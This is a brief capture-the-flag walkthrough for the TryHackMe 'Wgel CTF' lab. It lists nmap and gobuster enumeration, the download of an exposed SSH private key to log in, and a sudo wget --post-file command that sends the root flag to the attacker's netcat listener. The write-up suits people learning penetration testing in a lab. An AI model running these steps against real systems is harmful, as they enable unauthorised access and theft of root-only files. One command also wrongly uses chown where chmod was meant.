---
description: https://tryhackme.com/room/wgelctf
---

# Wgel CTF

## :writing\_hand: Solution

### **User flag**

```
sudo nmap 10.10.151.61
```

![](<../../.gitbook/assets/Screenshot from 2020-08-31 10-44-12.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-28 16-26-15.png>)

```
gobuster dir -u http://10.10.151.61/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t 64
```

![](<../../.gitbook/assets/Screenshot from 2020-08-31 10-45-51.png>)

```
gobuster dir -u http://10.10.54.90/sitemap/ \
             -w /usr/share/dirb/wordlists/common.txt \
             -t 64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 16-23-17.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-28 16-24-47.png>)

```
wget http://10.10.54.90/sitemap/.ssh/id_rsa
sudo chown 600 id_rsa
ssh -i id_rsa jessie@10.10.54.90
```

```
$ ls -A *
$ cat Documents/user_flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 16-28-23.png>)

### Root flag

```bash
nc -nvlp 4444
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 16-40-44.png>)

```bash
sudo wget --post-file=/root/root_flag.txt http://10.9.101.193:4444/
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 16-40-48.png>)

## Support Material

{% embed url="https://gtfobins.github.io/gtfobins/wget/" %}
